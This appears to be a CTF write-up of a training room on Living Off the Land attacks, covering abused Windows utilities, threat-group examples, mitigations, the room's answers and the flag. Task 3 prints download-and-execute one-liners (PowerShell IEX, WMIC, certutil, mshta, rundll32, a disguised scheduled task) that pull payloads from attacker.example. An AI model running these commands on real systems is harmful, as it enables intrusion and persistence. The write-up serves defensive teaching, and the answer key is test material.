# Living Off the Land Attacks

## Overview

This room covers how threat actors abuse trusted, built in Windows utilities to carry out malicious activity while blending in with normal administrative behavior. The room walks through why Living Off the Land (LOTL) techniques are effective, the tools most commonly abused, real world examples from named threat groups, hands on command examples with detection logic, and a final lab where alerts had to be classified to retrieve the flag.

## Task 1: Introduction

Threat actors use Living Off the Land techniques because built in tools are already trusted, widely available, and often allowed by default security controls. This lets malicious activity hide among normal operations. Commonly abused tools provide scripting, management, file handling, or scheduling capabilities that map directly to attacker needs like execution, persistence, reconnaissance, and lateral movement:

- **PowerShell** for in memory scripting, remote downloads, and automation
- **WMIC/WMI** for running commands locally or on remote hosts and querying system state
- **Certutil** for fetching files and encoding/decoding payloads
- **Mshta** for running HTA content or inline scripts
- **Rundll32** for invoking DLL exports or triggering URL handlers
- **Scheduled tasks (schtasks)** for persistence

Operators also abuse signed Sysinternals utilities like PsExec (remote execution) and Autoruns (persistence discovery/manipulation) since these blend with legitimate admin workflows.

LOTL is not Windows only. Public collections document abuse patterns for both platforms:
- LOLBAS for Windows
- GTFOBins for Unix/Linux

Defensive measures include layered controls, application control policies (AppLocker, WDAC), least privilege access to system management utilities, network/DNS filtering, containment playbooks, and regular review of access and logging coverage.

**Q: Which public site lists Unix/Linux native binaries and how they can be abused?**
```
GTFOBins
```

**Q: Which Microsoft toolset includes PsExec and Autoruns, used for admin tasks and often misused by attackers?**
```
Sysinternals
```

## Task 2: Real World Threat Group Examples

LOTL techniques are used by both state sponsored and financially motivated groups to stay under the radar.

**APT29 (Nobelium)** combined PowerShell with WMI event subscriptions to persist and execute code without dropping obvious binaries on disk. The payload was stored, decrypted, and executed from WMI properties, leaving minimal on disk artifacts. This maps to MITRE ATT&CK T1546.003 (WMI Event Subscription).

**BlackCat (ALPHV) ransomware** used PowerShell for scripting and defense disabling, PsExec for remote execution and lateral movement, and certutil style techniques for handling files.

**QakBot and IcedID loaders** have been used to stage and deliver Cobalt Strike beacons. Attackers commonly use signed Windows binaries like rundll32.exe and mshta.exe to execute or bootstrap those payloads in memory. Cobalt Strike beacons can also use SMB named pipes to relay traffic between infected hosts.

**Q: What MITRE technique ID covers WMI event subscriptions?**
```
T1546.003
```

**Q: Which abbreviated name refers to one of the services that C2s, like Cobalt Strike, use to start or listen for remote services?**
```
SMB
```

## Task 3: Hands On LOTL Techniques

This task walked through practical command examples and Splunk style detection logic for each abused tool.

### PowerShell
```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
```
`IEX` (Invoke-Expression) combined with `DownloadString` lets an attacker fetch and run a script in memory, avoiding disk artifacts. `-EncodedCommand` hides payloads in base64 to slow down log review.

### WMIC
```
wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
```
The `process call create` keyword spawns a new process, locally or on a remote host, making WMIC an effective remote launcher and recon tool.

### Certutil
```
certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe
certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\decoded.exe
```
Certutil can fetch remote files and decode base64 payloads, letting attackers transport a binary as text and reconstruct it on the host.

### Mshta
```
mshta "http://attacker.example/payload.hta"
```
Mshta runs HTA files containing VBScript or JavaScript, including inline script that can directly spawn system commands.

### Rundll32
```
rundll32.exe C:\Users\Public\backdoor.dll,Start
```
Rundll32 calls exported DLL functions directly, which can execute embedded loader logic or shellcode from a writable location.

### Scheduled Tasks
```
schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP -NonI -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.example/ps1')"
```
Tasks created with benign sounding names (like "WindowsUpdate") provide persistence at logon or on a recurring schedule.

**Q: Which PowerShell switch is used to download text/strings and execute them?**
```
IEX
```

**Q: Which WMIC keyword triggers the creation of a new process on a remote host?**
```
create
```

## Task 4: Lab, Classify the Alerts

The final task required starting the lab machine and classifying a set of generated alerts against the techniques covered earlier (PowerShell in memory execution, WMIC remote process creation, certutil download/encode, mshta HTA execution, rundll32 DLL export abuse, and schtasks persistence) to retrieve the flag.

**Q: What is the flag?**
```
THM{LOL-but-not-that-lol-you-finishit}
```

## Key Takeaways

- Living Off the Land attacks succeed because they rely on tools that are already trusted, signed, and allowed by default policy, which makes signature based detection ineffective.
- Detection has to focus on command line content, parent/child process relationships, and behavioral context rather than the binary name alone.
- The same six utilities (PowerShell, WMIC, certutil, mshta, rundll32, schtasks) show up repeatedly across real world threat actor campaigns (APT29, BlackCat/ALPHV, QakBot, IcedID) because they cover the full attacker lifecycle: execution, persistence, lateral movement, and evasion.
- LOLBAS and GTFOBins are essential references for tracking which native binaries are being abused on Windows and Unix/Linux respectively.
- Effective mitigation combines application control (AppLocker/WDAC), least privilege on admin utilities, and layered logging that captures full command lines, not just process names.
